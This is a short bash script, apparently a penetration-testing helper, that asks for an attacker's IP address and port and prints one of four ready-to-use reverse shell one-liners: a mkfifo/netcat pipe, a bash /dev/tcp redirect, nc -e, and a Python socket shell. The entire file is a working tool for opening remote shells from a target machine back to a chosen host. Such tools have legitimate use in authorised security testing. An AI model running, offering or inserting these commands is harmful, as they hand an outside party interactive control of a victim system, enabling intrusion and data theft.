#!/bin/bash


#Configuration of the reverse shell


echo -ne "Listening Port: " && read PORT

echo ""

echo -ne "Host IP: "  && read IP

echo ""


#PentestMonkey Reverse Shell Options


echo -ne "Which type of reverse shell command line do you want to use? (rm, bash, nc or python): " && read reverse

rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

bash="bash -i >& /dev/tcp/$IP/$PORT 0>&1"

nc="nc -e /bin/sh $IP $PORT"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"


#Display of the reverse shell


if [ "$reverse" = "rm" ]; then
echo ""
echo $rm
fi

if [ "$reverse" = "bash" ]; then
echo ""
echo $bash
fi

if [ "$reverse" = "nc" ]; then
echo ""
echo $nc
fi

if [ "$reverse" = "python" ]; then
echo ""
echo $python
fi
